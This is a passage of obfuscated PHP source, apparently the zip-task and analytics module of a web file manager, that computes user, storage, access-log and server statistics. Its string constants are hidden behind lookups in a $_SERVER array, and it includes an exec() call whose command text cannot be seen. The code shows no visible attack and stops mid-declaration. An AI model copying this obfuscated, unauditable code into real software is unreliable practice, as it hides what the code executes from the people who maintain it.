<?php
 goto FÓ†ƒ«Ã–Ú; AÉ†‘ØªÇ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $cÏ•Ú¿…É =& $_SERVER[…ë˜õ]; parent::startAfter(); Hook::bind($cÏ•Ú¿…É[1618], array($this, $cÏ•Ú¿…É[1613])); $aæÔÏ±ÒÜ­ =& $this->task; $aæÔÏ±ÒÜ­[$cÏ•Ú¿…É[1615]] = $cÏ•Ú¿…É[1099]; if (!$aæÔÏ±ÒÜ­[$cÏ•Ú¿…É[1436]]) { $aæÔÏ±ÒÜ­[$cÏ•Ú¿…É[1436]] = LNG($cÏ•Ú¿…É[1619]); } } protected function endAfter() { $e•§ˆø‰Ôì =& $_SERVER[…ë˜õ]; parent::endAfter(); Hook::unbind($e•§ˆø‰Ôì[1618], array($this, $e•§ˆø‰Ôì[1613])); } public function updateAfter() { $Dˆ»êçÍÑ„ =& $_SERVER[…ë˜õ]; $EÜÌ¨µŸ˜ =& $this->task; if (!$EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1027]] || !$EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[740]]) { return; } if ($EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1615]] == $Dˆ»êçÍÑ„[1099]) { $dğºù÷´êŞ = $EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1575]]; if ($EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1576]] != $Dˆ»êçÍÑ„[1099]) { $dğºù÷´êŞ = 0; } $E»àê° = ($EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1579]] + $dğºù÷´êŞ) / $EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[740]]; $EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1532]] = $E»àê° * 0.3; } else { if ($EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1615]] == $Dˆ»êçÍÑ„[309]) { $E»àê° = $EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1041]] / $EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1027]]; $EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1532]] = 0.3 + $E»àê° * 0.5; } else { if ($EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1615]] == $Dˆ»êçÍÑ„[106]) { $E»àê° = 0; if ($EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1574]]) { $E»àê° = $EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1575]] / $EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1574]]; } $EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1532]] = 0.3 + 0.5 + $E»àê° * 0.2; } } } if ($EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1532]] > 0) { $CÌ•¥Şª™Á = timeFloat() - $EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[762]] - $EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1535]]; $EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1536]] = $CÌ•¥Şª™Á * (1 - $EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1532]]) / $EÜÌ¨µŸ˜[$Dˆ»êçÍÑ„[1532]]; } } public function copyFileStart($BÍÍ¼İ¬‘, $FíÉ•°ÄÙÑ, $f–ÏÉ£Øæ§, $Aœ¦´†”µÈ, $A…»á·è„, $AĞØ‹ÎóÆƒ) { $A„ö³‡åí =& $_SERVER[…ë˜õ]; parent::copyFileStart($BÍÍ¼İ¬‘, $FíÉ•°ÄÙÑ, $f–ÏÉ£Øæ§, $Aœ¦´†”µÈ, $A…»á·è„, $AĞØ‹ÎóÆƒ); $c˜Â…¾§ÄÑ =& $this->task; if ($c˜Â…¾§ÄÑ[$A„ö³‡åí[1615]] == $A„ö³‡åí[309]) { $c˜Â…¾§ÄÑ[$A„ö³‡åí[1615]] = $A„ö³‡åí[106]; } $this->update(); } public function copyFileEnd($eô¤Šˆ¼Ñƒ, $D²Õ«Å‘Îº, $c„õÒÜŞ–‚, $bƒßØÊñÂ, $c‚¼·ÎÂ¡, $f‘×ÄôùíÜ) { $bƒÂ©—–±½ =& $_SERVER[…ë˜õ]; $a²’ùšÑòˆ =& $this->task; $a²’ùšÑòˆ[$bƒÂ©—–±½[1575]] = $a²’ùšÑòˆ[$bƒÂ©—–±½[1574]]; $a²’ùšÑòˆ[$bƒÂ©—–±½[1579]] += $a²’ùšÑòˆ[$bƒÂ©—–±½[1574]]; $a²’ùšÑòˆ[$bƒÂ©—–±½[1576]] = $bƒÂ©—–±½[33]; $this->update(); } public function nameParse($BËãÉÖ©®—) { $eŸÂÚ¢‹ò¿ =& $_SERVER[…ë˜õ]; $D·¿èĞ˜¦ =& $this->task; if ($D·¿èĞ˜¦[$eŸÂÚ¢‹ò¿[1041]] < $D·¿èĞ˜¦[$eŸÂÚ¢‹ò¿[1027]]) { $dÖ¡¸ñõš® = get_path_this($BËãÉÖ©®—); if (strstr($dÖ¡¸ñõš®, $eŸÂÚ¢‹ò¿[94])) { $D·¿èĞ˜¦[$eŸÂÚ¢‹ò¿[1041]] += 1; } } if ($D·¿èĞ˜¦[$eŸÂÚ¢‹ò¿[1615]] == $eŸÂÚ¢‹ò¿[1099]) { $D·¿èĞ˜¦[$eŸÂÚ¢‹ò¿[1615]] = $eŸÂÚ¢‹ò¿[309]; } $D·¿èĞ˜¦[$eŸÂÚ¢‹ò¿[1572]] = $BËãÉÖ©®—; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($fÚ¹îÇ”©—) { $A”ŒÃİ ¶ë =& $_SERVER[…ë˜õ]; $a‡¼‚ªµ™® = array($A”ŒÃİ ¶ë[557] => array($A”ŒÃİ ¶ë[29] => $A”ŒÃİ ¶ë[1620], $A”ŒÃİ ¶ë[269] => array($A”ŒÃİ ¶ë[220], $A”ŒÃİ ¶ë[742], $A”ŒÃİ ¶ë[1621], $A”ŒÃİ ¶ë[1622])), $A”ŒÃİ ¶ë[1623] => array($A”ŒÃİ ¶ë[29] => $A”ŒÃİ ¶ë[1624], $A”ŒÃİ ¶ë[269] => array($A”ŒÃİ ¶ë[220], $A”ŒÃİ ¶ë[740], $A”ŒÃİ ¶ë[1625], $A”ŒÃİ ¶ë[1626], $A”ŒÃİ ¶ë[1627]))); if (!isset($a‡¼‚ªµ™®[$fÚ¹îÇ”©—])) { return !1; } $this->optionType = $a‡¼‚ªµ™®[$fÚ¹îÇ”©—][$A”ŒÃİ ¶ë[29]]; $this->field = $a‡¼‚ªµ™®[$fÚ¹îÇ”©—][$A”ŒÃİ ¶ë[269]]; return !0; } public function listData($eËÄ’ù§‰ = false, $Eã¡§µºÆÖ = "\x6d\x6f\x64\151\x66\171\124\151\155\x65", $EÔá‡¯í¨ = false) { return parent::listData($eËÄ’ù§‰, $Eã¡§µºÆÖ, $EÔá‡¯í¨); } public function trendList($b¸¢ãÛ¯³¶) { goto A¨¾¡¦èßÆ; dØŞæ¾»‚: if (!isset($B›”³¾¡›ù)) { $F˜¸Œ©œ½ = $b¸¢ãÛ¯³¶ == $E¥ğÃêâŠ[557] ? $E¥ğÃêâŠ[501] : $E¥ğÃêâŠ[796]; $B›”³¾¡›ù = Model($F˜¸Œ©œ½)->min($E¥ğÃêâŠ[192]); } $b’†Ìİ£Ç = $E¥ğÃêâŠ[1630] . ucfirst($b¸¢ãÛ¯³¶); $fŠ°¸°îèÚ = $this->dateList($B›”³¾¡›ù); goto CğÖâ‘”Û—; A¨¾¡¦èßÆ: $E¥ğÃêâŠ =& $_SERVER[…ë˜õ]; $A‚Ò­à«Œ = $this->listData(); if ($A‚Ò­à«Œ) { $BŠëœÖì± = end($A‚Ò­à«Œ); $dåÌ‘Ï²Ğ = date($E¥ğÃêâŠ[1628], strtotime($E¥ğÃêâŠ[1629])); if ($BŠëœÖì±[$E¥ğÃêâŠ[220]] == $dåÌ‘Ï²Ğ) { return $A‚Ò­à«Œ; } $B›”³¾¡›ù = strtotime($BŠëœÖì±[$E¥ğÃêâŠ[220]]); } goto dØŞæ¾»‚; CğÖâ‘”Û—: foreach ($fŠ°¸°îèÚ as $dåÌ‘Ï²Ğ) { $this->{$b’†Ìİ£Ç}($dåÌ‘Ï²Ğ); } return $this->listData(); goto cƒ½²†îÕ; cƒ½²†îÕ: } private function dateList($Bï‹ÖéÍ) { $CòÒù¶É =& $_SERVER[…ë˜õ]; $Bï¯Œ³‰™ò = $Bï‹ÖéÍ; $e¬àóÕÈ½ = strtotime($CòÒù¶É[1629]); $cƒà’†á• = array(); while ($Bï¯Œ³‰™ò <= $e¬àóÕÈ½) { $cƒà’†á•[] = date($CòÒù¶É[1628], $Bï¯Œ³‰™ò); $Bï¯Œ³‰™ò = strtotime($CòÒù¶É[1631], $Bï¯Œ³‰™ò); } return $cƒà’†á•; } public function _recordUser($eÑÙÛõ‡ˆ = '') { goto a®íÑÜä•; f¨ßÓ¹ö·¾: $câ¯ê¬êçƒ = Model($a˜ö‚È¼¼Ê[501])->where($eöÖ·ìƒš¯)->count($a˜ö‚È¼¼Ê[1531]); $eöÖ·ìƒš¯[$a˜ö‚È¼¼Ê[29]] = $a˜ö‚È¼¼Ê[1634]; $FŠãìî© = Model($a˜ö‚È¼¼Ê[1635])->where($eöÖ·ìƒš¯)->count($a˜ö‚È¼¼Ê[1636]); goto F—©ÒÆ‘; F—©ÒÆ‘: $a³…µ˜©Çğ = array($a˜ö‚È¼¼Ê[220] => $eÑÙÛõ‡ˆ, $a˜ö‚È¼¼Ê[742] => (int) $DÇ¼¸¶¯Ñ¨, $a˜ö‚È¼¼Ê[1621] => (int) $câ¯ê¬êçƒ, $a˜ö‚È¼¼Ê[1622] => (int) $FŠãìî©); return $this->insert($a³…µ˜©Çğ); goto CˆÔÏ®„İõ; a®íÑÜä•: $a˜ö‚È¼¼Ê =& $_SERVER[…ë˜õ]; $E“…ŸËİİ› = strtotime(date($a˜ö‚È¼¼Ê[1632], strtotime($eÑÙÛõ‡ˆ))); $f¥ì·êë‚ = strtotime(date($a˜ö‚È¼¼Ê[1633], strtotime($eÑÙÛõ‡ˆ))); goto Fœààíê¥†; Fœààíê¥†: $eöÖ·ìƒš¯ = array($a˜ö‚È¼¼Ê[192] => array($a˜ö‚È¼¼Ê[976], $f¥ì·êë‚)); $DÇ¼¸¶¯Ñ¨ = Model($a˜ö‚È¼¼Ê[501])->where($eöÖ·ìƒš¯)->count($a˜ö‚È¼¼Ê[1531]); $eöÖ·ìƒš¯[$a˜ö‚È¼¼Ê[192]] = array($a˜ö‚È¼¼Ê[329], array($E“…ŸËİİ›, $f¥ì·êë‚)); goto f¨ßÓ¹ö·¾; CˆÔÏ®„İõ: } public function _recordStore($eÜÔÆ“Ë‚ñ = '') { goto b²ĞäÇ—ªŸ; b²ĞäÇ—ªŸ: $A×ğË¢ªó =& $_SERVER[…ë˜õ]; $e™ĞÒò’ÏÏ = strtotime(date($A×ğË¢ªó[1633], strtotime($eÜÔÆ“Ë‚ñ))); $f±ØÄŸÀï = array($A×ğË¢ªó[192] => array($A×ğË¢ªó[976], $e™ĞÒò’ÏÏ)); goto BĞîæµÏÄ; d‹ºÆ‰«Ø„: $aæ³—±•é = Model($A×ğË¢ªó[796])->where($f±ØÄŸÀï)->sum($A×ğË¢ªó[77]); $b¤÷ÄÜÚ = array($A×ğË¢ªó[220] => $eÜÔÆ“Ë‚ñ, $A×ğË¢ªó[740] => (int) $F¸–êóäÍ…, $A×ğË¢ªó[1625] => (int) $CœâÙëÜã, $A×ğË¢ªó[1626] => (int) $c‡«êœ‘Í¼, $A×ğË¢ªó[1627] => (int) $aæ³—±•é); return $this->insert($b¤÷ÄÜÚ); goto dã±ëí¶ç; DÎˆ°Ö›ãÜ: $f±ØÄŸÀï[$A×ğË¢ªó[398]] = 1; $c‡«êœ‘Í¼ = Model($A×ğË¢ªó[796])->where($f±ØÄŸÀï)->sum($A×ğË¢ªó[77]); $f±ØÄŸÀï[$A×ğË¢ªó[398]] = 2; goto d‹ºÆ‰«Ø„; BĞîæµÏÄ: $CœâÙëÜã = Model($A×ğË¢ªó[444])->where($f±ØÄŸÀï)->sum($A×ğË¢ªó[77]); $f±ØÄŸÀï[$A×ğË¢ªó[397]] = 0; $F¸–êóäÍ… = Model($A×ğË¢ªó[796])->where($f±ØÄŸÀï)->sum($A×ğË¢ªó[77]); goto DÎˆ°Ö›ãÜ; dã±ëí¶ç: } public function trend($eƒÒŒßØÈ, $B®ßöÊëæ) { goto Bğö•ÏĞƒ; CÕ±Š—Ü”“: if (empty($bÇğ»é¦†)) { $BÀàÃ·â = date($eöºŸ™‰›‹[1628], strtotime($eöºŸ™‰›‹[1629])); $bË¥ÀÍ„ò = array($eöºŸ™‰›‹[220] => $BÀàÃ·â); foreach ($E³İ“°ôŒ¯[$eƒÒŒßØÈ] as $Eª‰Öõ¬À => $cŒ½¬îŠ‹¬) { $bË¥ÀÍ„ò[$Eª‰Öõ¬À] = 0; } $bÇğ»é¦†[] = $bË¥ÀÍ„ò; } $BÓÒçãöŠá = array(); foreach ($bÇğ»é¦† as $cŒ½¬îŠ‹¬) { if ($eƒÒŒßØÈ == $eöºŸ™‰›‹[1623] && $cŒ½¬îŠ‹¬[$eöºŸ™‰›‹[1625]] > $cŒ½¬îŠ‹¬[$eöºŸ™‰›‹[740]]) { $cŒ½¬îŠ‹¬[$eöºŸ™‰›‹[1625]] = $cŒ½¬îŠ‹¬[$eöºŸ™‰›‹[740]]; } foreach ($E³İ“°ôŒ¯[$eƒÒŒßØÈ] as $Eª‰Öõ¬À => $Cî”İ¯‘ò) { $CÕØÔî§Å = array($eöºŸ™‰›‹[220] => $cŒ½¬îŠ‹¬[$eöºŸ™‰›‹[220]], $eöºŸ™‰›‹[1436] => $Cî”İ¯‘ò); $CÕØÔî§Å[$F‡ ­è­òË[$eƒÒŒßØÈ]] = isset($cŒ½¬îŠ‹¬[$Eª‰Öõ¬À]) ? $cŒ½¬îŠ‹¬[$Eª‰Öõ¬À] : 0; $BÓÒçãöŠá[] = $CÕØÔî§Å; } } goto Aæâ‘ˆª¹…; Aæâ‘ˆª¹…: return $BÓÒçãöŠá; goto A¢ÙöÇìóè; Bğö•ÏĞƒ: $eöºŸ™‰›‹ =& $_SERVER[…ë˜õ]; if (!$this->init($eƒÒŒßØÈ)) { return !1; } $bÇğ»é¦† = $this->trendList($eƒÒŒßØÈ); goto b‘ÚçËºô’; b‘ÚçËºô’: if ($bÇğ»é¦† && $B®ßöÊëæ != $eöºŸ™‰›‹[1504]) { $f•£ á˜Ôñ = $bÇğ»é¦†[0][$eöºŸ™‰›‹[220]]; $c˜Ä¿ïãµò = $this->validDate($B®ßöÊëæ, $f•£ á˜Ôñ); $FëŒÄğ°¬Ä = array(); $eß†±•¶ = array_to_keyvalue($bÇğ»é¦†, $eöºŸ™‰›‹[220]); foreach ($c˜Ä¿ïãµò as $BÀàÃ·â) { if (isset($eß†±•¶[$BÀàÃ·â])) { $CÕØÔî§Å = $eß†±•¶[$BÀàÃ·â]; } else { $CÕØÔî§Å = end($bÇğ»é¦†); $CÕØÔî§Å[$eöºŸ™‰›‹[220]] = $BÀàÃ·â; if ($eƒÒŒßØÈ == $eöºŸ™‰›‹[557]) { $CÕØÔî§Å[$eöºŸ™‰›‹[1621]] = $CÕØÔî§Å[$eöºŸ™‰›‹[1622]] = 0; } } $FëŒÄğ°¬Ä[] = $CÕØÔî§Å; } $bÇğ»é¦† = $FëŒÄğ°¬Ä; } $E³İ“°ôŒ¯ = array($eöºŸ™‰›‹[557] => array($eöºŸ™‰›‹[742] => LNG($eöºŸ™‰›‹[1637]), $eöºŸ™‰›‹[1621] => LNG($eöºŸ™‰›‹[1638]), $eöºŸ™‰›‹[1622] => LNG($eöºŸ™‰›‹[1639])), $eöºŸ™‰›‹[1623] => array($eöºŸ™‰›‹[740] => LNG($eöºŸ™‰›‹[1640]), $eöºŸ™‰›‹[1625] => LNG($eöºŸ™‰›‹[1641]), $eöºŸ™‰›‹[1626] => LNG($eöºŸ™‰›‹[1642]), $eöºŸ™‰›‹[1627] => LNG($eöºŸ™‰›‹[1643]))); $F‡ ­è­òË = array($eöºŸ™‰›‹[557] => $eöºŸ™‰›‹[1644], $eöºŸ™‰›‹[1623] => $eöºŸ™‰›‹[77]); goto CÕ±Š—Ü”“; A¢ÙöÇìóè: } public function validDate($BŠ®Ì“­½ù, $Cˆ¿™„‰•ñ) { goto A¿õ…ßİ«Û; A¿õ…ßİ«Û: $Bšªµ©ğÆ =& $_SERVER[…ë˜õ]; $A¶¡ÔÑ¸ô¸ = date($Bšªµ©ğÆ[1628], strtotime($Bšªµ©ğÆ[1629])); $EŠ–óÂŸè = array($A¶¡ÔÑ¸ô¸); goto CŒÇˆê­Ü; bèÓ›ÂÛ¼: return $EŠ–óÂŸè; goto eÜ¼…Ôº‡¦; CŒÇˆê­Ü: switch ($BŠ®Ì“­½ù) { case $Bšªµ©ğÆ[1511]: $Aó™ ¬µî½ = mktime(0, 0, 0, date($Bšªµ©ğÆ[1645]), date($Bšªµ©ğÆ[1257]) - date($Bšªµ©ğÆ[1319]) + 7 - 7, date($Bšªµ©ğÆ[1646])); $bí±Ö¾ÎÀˆ = 0; do { $Fó’©ºŞ‹ = date($Bšªµ©ğÆ[1628], $Aó™ ¬µî½ - 3600 * 24 * 7 * $bí±Ö¾ÎÀˆ); $EŠ–óÂŸè[] = $Fó’©ºŞ‹; $bí±Ö¾ÎÀˆ++; } while ($Cˆ¿™„‰•ñ < $Fó’©ºŞ‹); break; case $Bšªµ©ğÆ[1509]: $bí±Ö¾ÎÀˆ = 1; do { $dŞ¯‹¼ÏÇˆ = date($Bšªµ©ğÆ[1647], strtotime("\55\40{$bí±Ö¾ÎÀˆ}\x20\155\157\156\164\x68\163")); $EŠ–óÂŸè[] = $dŞ¯‹¼ÏÇˆ; $bí±Ö¾ÎÀˆ++; } while ($Cˆ¿™„‰•ñ < $dŞ¯‹¼ÏÇˆ); break; case $Bšªµ©ğÆ[1648]: $BöÂŞ„áæŞ = (int) date($Bšªµ©ğÆ[1646], strtotime($Cˆ¿™„‰•ñ)); $BöÔ¨‚Ç˜« = (int) date($Bšªµ©ğÆ[1646]); if ($BöÂŞ„áæŞ >= $BöÔ¨‚Ç˜«) { break; } for ($BöÂŞ„áæŞ; $BöÂŞ„áæŞ < $BöÔ¨‚Ç˜«; $BöÂŞ„áæŞ++) { $EŠ–óÂŸè[] = $BöÂŞ„áæŞ . $Bšªµ©ğÆ[1649]; } break; default: break; } if ($Cˆ¿™„‰•ñ > end($EŠ–óÂŸè)) { array_pop($EŠ–óÂŸè); } sort($EŠ–óÂŸè); goto bèÓ›ÂÛ¼; eÜ¼…Ôº‡¦: } public function listTable($d±ªƒÏ¬Ší) { $fæ”¥ç‹Ö = ucfirst($d±ªƒÏ¬Ší); return Model($fæ”¥ç‹Ö)->listData(); } public function option($cÏˆÊš›) { $d”Õöîïé  = $_SERVER[…ë˜õ][1650] . ucfirst($cÏˆÊš›); return $this->{$d”Õöîïé }(); } private function optionUser() { goto B’ñïÅ„ÄĞ; c…ŠŞ¦Óİ½: $fçØ®İÒçğ = intval($GLOBALS[$dä›¹æŠŠ“[6]][$dä›¹æŠŠ“[345]][$dä›¹æŠŠ“[1490]]) / 3600; $b¡•‘óÏù = strtotime("\x2d{$fçØ®İÒçğ}\40\150\157\165\162\x73"); $BŸƒÈ¤îªÛ = strtotime(date($dä›¹æŠŠ“[1632])); goto A°õê±áë; e¿Ç™›—–¦: return array($dä›¹æŠŠ“[737] => (int) $e‡§«ù‹µé, $dä›¹æŠŠ“[1653] => (int) ($e‡§«ù‹µé - $A ÌÓ›íœ†), $dä›¹æŠŠ“[1654] => (int) $A ÌÓ›íœ†, $dä›¹æŠŠ“[1655] => (int) $EùÏò§Œ•œ, $dä›¹æŠŠ“[1656] => $CÀ–á¹Ûğ); goto eõË‹œ¼ó£; B’ñïÅ„ÄĞ: $dä›¹æŠŠ“ =& $_SERVER[…ë˜õ]; $e‡§«ù‹µé = Model($dä›¹æŠŠ“[501])->count($dä›¹æŠŠ“[1531]); $A ÌÓ›íœ† = Model($dä›¹æŠŠ“[501])->where($dä›¹æŠŠ“[1651])->count($dä›¹æŠŠ“[1531]); goto c…ŠŞ¦Óİ½; A°õê±áë: if ($b¡•‘óÏù < $BŸƒÈ¤îªÛ) { $b¡•‘óÏù = $BŸƒÈ¤îªÛ; } $e„ÉĞĞø„ = array($dä›¹æŠŠ“[1652] => array($dä›¹æŠŠ“[977], $b¡•‘óÏù)); $CÀ–á¹Ûğ = (int) Model($dä›¹æŠŠ“[501])->where($e„ÉĞĞø„)->count($dä›¹æŠŠ“[1531]); goto a¬ñ‘ŒË ; a¬ñ‘ŒË : if (!$CÀ–á¹Ûğ) { $CÀ–á¹Ûğ = 1; } $e„ÉĞĞø„ = array($dä›¹æŠŠ“[1652] => array($dä›¹æŠŠ“[977], $BŸƒÈ¤îªÛ)); $EùÏò§Œ•œ = Model($dä›¹æŠŠ“[501])->where($e„ÉĞĞø„)->count($dä›¹æŠŠ“[1531]); goto e¿Ç™›—–¦; eõË‹œ¼ó£: } private function optionFile() { goto a¿“¬Ş¾¶; DŸ¢‡²É¹µ: $cİ•Ÿ›Óª = $fÌ±”„ÅÕ‘[$eËó÷òã¡¦[1625]]; $fĞÏåš•ó = Model($eËó÷òã¡¦[796])->where(array($eËó÷òã¡¦[397] => 0))->count($eËó÷òã¡¦[390]); $EÖ¾Óšµä« = array($eËó÷òã¡¦[397] => 0, $eËó÷òã¡¦[192] => array($eËó÷òã¡¦[977], strtotime(date($eËó÷òã¡¦[1632])))); goto CÅœŸ—¸¡¥; CÅœŸ—¸¡¥: $Eë»µ©ĞœÇ = Model($eËó÷òã¡¦[796])->where($EÖ¾Óšµä«)->sum($eËó÷òã¡¦[77]); $f×Ü›¯ÍÈ = Model($eËó÷òã¡¦[796])->where($EÖ¾Óšµä«)->count($eËó÷òã¡¦[390]); return array($eËó÷òã¡¦[740] => $eÙ‘²¿˜õ¥, $eËó÷òã¡¦[1625] => $cİ•Ÿ›Óª, $eËó÷òã¡¦[1657] => $eÙ‘²¿˜õ¥ - $cİ•Ÿ›Óª, $eËó÷òã¡¦[1658] => (int) $Eë»µ©ĞœÇ, $eËó÷òã¡¦[742] => (int) $fĞÏåš•ó, $eËó÷òã¡¦[1659] => (int) $f×Ü›¯ÍÈ); goto A®“õàİš; a¿“¬Ş¾¶: $eËó÷òã¡¦ =& $_SERVER[…ë˜õ]; $fÌ±”„ÅÕ‘ = $this->sourceSize(); $eÙ‘²¿˜õ¥ = $fÌ±”„ÅÕ‘[$eËó÷òã¡¦[77]]; goto DŸ¢‡²É¹µ; A®“õàİš: } private function optionAccess() { $Fî¹éèíØñ =& $_SERVER[…ë˜õ]; return array($Fî¹éèíØñ[737] => $this->typeLogCnt(), $Fî¹éèíØñ[106] => $this->typeLogCnt($Fî¹éèíØñ[106]), $Fî¹éèíØñ[424] => $this->typeLogCnt($Fî¹éèíØñ[424]), $Fî¹éèíØñ[1660] => $this->typeLogCnt($Fî¹éèíØñ[1660]), $Fî¹éèíØñ[1661] => $this->typeLogCnt($Fî¹éèíØñ[1661]), $Fî¹éèíØñ[557] => $this->typeLogCnt($Fî¹éèíØñ[33], $Fî¹éèíØñ[1636])); } private function typeLogCnt($dË¬âÔŒãª = '', $c¡çŒè´Ş” = "\151\144") { goto f­ºó–ÃœÆ; d÷Á„›œ¯Æ: $EÆ¿È®ÔÉ = array($eˆ½ŠÌ±ƒ[192] => array($eˆ½ŠÌ±ƒ[977], $Fõ­¾…èô )); if ($dË¬âÔŒãª) { $EÆ¿È®ÔÉ[$eˆ½ŠÌ±ƒ[29]] = array($eˆ½ŠÌ±ƒ[7], $D‡ÄÔ‹¿æ[$dË¬âÔŒãª]); } $bº´ÃøËÈ = Model($eˆ½ŠÌ±ƒ[1635])->where($EÆ¿È®ÔÉ)->count($c¡çŒè´Ş”); goto AÇš°›Ñ‹ç; f­ºó–ÃœÆ: $eˆ½ŠÌ±ƒ =& $_SERVER[…ë˜õ]; $D‡ÄÔ‹¿æ = array($eˆ½ŠÌ±ƒ[106] => array($eˆ½ŠÌ±ƒ[1662], $eˆ½ŠÌ±ƒ[1663]), $eˆ½ŠÌ±ƒ[424] => array($eˆ½ŠÌ±ƒ[1664], $eˆ½ŠÌ±ƒ[1665]), $eˆ½ŠÌ±ƒ[1660] => array($eˆ½ŠÌ±ƒ[1666], $eˆ½ŠÌ±ƒ[1667], $eˆ½ŠÌ±ƒ[1668]), $eˆ½ŠÌ±ƒ[1661] => array($eˆ½ŠÌ±ƒ[1669], $eˆ½ŠÌ±ƒ[1670]), $eˆ½ŠÌ±ƒ[1671] => array($eˆ½ŠÌ±ƒ[1672], $eˆ½ŠÌ±ƒ[1673], $eˆ½ŠÌ±ƒ[1674])); $Fõ­¾…èô  = strtotime(date($eˆ½ŠÌ±ƒ[1632])); goto d÷Á„›œ¯Æ; AÇš°›Ñ‹ç: return (int) $bº´ÃøËÈ; goto bÈºŒ‹ÌßÈ; bÈºŒ‹ÌßÈ: } private function optionServer() { goto B—£ï¢ä•‹; eÏèŸ›†öÇ: $A“íá¹±º¶ = array($aŞõÇµ§‚Í[789] => $aÁ–Õ«‡Åé[$aŞõÇµ§‚Í[388]]); $C¢‡¶¼–™ä = Model($aŞõÇµ§‚Í[444])->where($A“íá¹±º¶)->sum($aŞõÇµ§‚Í[77]); $Bõ¥äĞ…ò = explode($aŞõÇµ§‚Í[50], $_SERVER[$aŞõÇµ§‚Í[141]]); goto Då¼ó¬ì; B‹¼ìÁ«‹Ã: if ($F¶©Ì®ÛÜ == $aŞõÇµ§‚Í[767]) { $Dëå™ÜÄß™ = explode($aŞõÇµ§‚Í[1170], $d±í§Ê¿Ş”[$aŞõÇµ§‚Í[937]]); $F¶©Ì®ÛÜ = $Dëå™ÜÄß™[0]; } if ($F¶©Ì®ÛÜ == $aŞõÇµ§‚Í[770] || $F¶©Ì®ÛÜ == $aŞõÇµ§‚Í[771]) { $BİÉ¾¬ – = Model()->db()->query($aŞõÇµ§‚Í[1675]); $b°³ÂÂÉ˜« = $BİÉ¾¬ –[0] && isset($BİÉ¾¬ –[0][$aŞõÇµ§‚Í[1435]]) ? $BİÉ¾¬ –[0][$aŞõÇµ§‚Í[1435]] : 0; $F¶©Ì®ÛÜ = $aŞõÇµ§‚Í[1676] . ($b°³ÂÂÉ˜« ? $aŞõÇµ§‚Í[8] . $b°³ÂÂÉ˜« : $aŞõÇµ§‚Í[33]); } $B­‰ã²îôÑ = $GLOBALS[$aŞõÇµ§‚Í[6]][$aŞõÇµ§‚Í[345]][$aŞõÇµ§‚Í[798]]; goto aà›ÒìÄø; Då¼ó¬ì: $EÇ¶¦†Äí½ = $Bõ¥äĞ…ò[0]; $d±í§Ê¿Ş” = $GLOBALS[$aŞõÇµ§‚Í[6]][$aŞõÇµ§‚Í[17]]; $F¶©Ì®ÛÜ = $d±í§Ê¿Ş”[$aŞõÇµ§‚Í[938]]; goto B‹¼ìÁ«‹Ã; B—£ï¢ä•‹: $aŞõÇµ§‚Í =& $_SERVER[…ë˜õ]; $CÜİöİ‰ë— = $this->diskDriver(); $aÁ–Õ«‡Åé = KodIO::defaultDriver(); goto eÏèŸ›†öÇ; aà›ÒìÄø: return array($aŞõÇµ§‚Í[1677] => $CÜİöİ‰ë— ? $CÜİöİ‰ë—[$aŞõÇµ§‚Í[1678]] : 0, $aŞõÇµ§‚Í[1679] => $CÜİöİ‰ë— ? $CÜİöİ‰ë—[$aŞõÇµ§‚Í[1680]] : 0, $aŞõÇµ§‚Í[1681] => (int) $aÁ–Õ«‡Åé[$aŞõÇµ§‚Í[1678]] * 1024 * 1024 * 1024, $aŞõÇµ§‚Í[1682] => (int) $C¢‡¶¼–™ä, $aŞõÇµ§‚Í[1683] => ucfirst($EÇ¶¦†Äí½), $aŞõÇµ§‚Í[1684] => $aŞõÇµ§‚Í[1685] . PHP_VERSION, $aŞõÇµ§‚Í[1686] => phpBuild64() ? 64 : 32, $aŞõÇµ§‚Í[736] => str_replace($aŞõÇµ§‚Í[1687], $aŞõÇµ§‚Í[954], $F¶©Ì®ÛÜ), $aŞõÇµ§‚Í[345] => ucfirst($B­‰ã²îôÑ), $aŞõÇµ§‚Í[28] => $_SERVER[$aŞõÇµ§‚Í[1688]]); goto Aêö¢Ö‚‚à; Aêö¢Ö‚‚à: } private function diskDriver() { goto AÛ½ÈÆˆºË; F¤Ë¢à¥×: if ($D…¿Íè…‹Ç) { $C”¼¤™Ç×¥ = $dÆâ¿¨Ã[1691]; if (function_exists($dÆâ¿¨Ã[1692])) { exec($dÆâ¿¨Ã[1693], $aìç“Œ²»Ñ); $C”¼¤™Ç×¥ = $aìç“Œ²»Ñ[1] . $dÆâ¿¨Ã[8]; } } if (!file_exists($C”¼¤™Ç×¥)) { return; } $d„ÈÈæ¢£» = @disk_total_space($C”¼¤™Ç×¥); goto cšÏÓàù—«; AÛ½ÈÆˆºË: $dÆâ¿¨Ã =& $_SERVER[…ë˜õ]; $C”¼¤™Ç×¥ = $dÆâ¿¨Ã[8]; $D…¿Íè…‹Ç = $GLOBALS[$dÆâ¿¨Ã[6]][$dÆâ¿¨Ã[1689]] == $dÆâ¿¨Ã[1690]; goto F¤Ë¢à¥×; cšÏÓàù—«: $DË…ïäƒÇ² = $d„ÈÈæ¢£» - @disk_free_space($C”¼¤™Ç×¥); return array($dÆâ¿¨Ã[1678] => $d„ÈÈæ¢£», $dÆâ¿¨Ã[1680] => $DË…ïäƒÇ²); goto bš¦Ğ‰ó°; bš¦Ğ‰ó°: } public function fileChart($e©„šğ„Í) 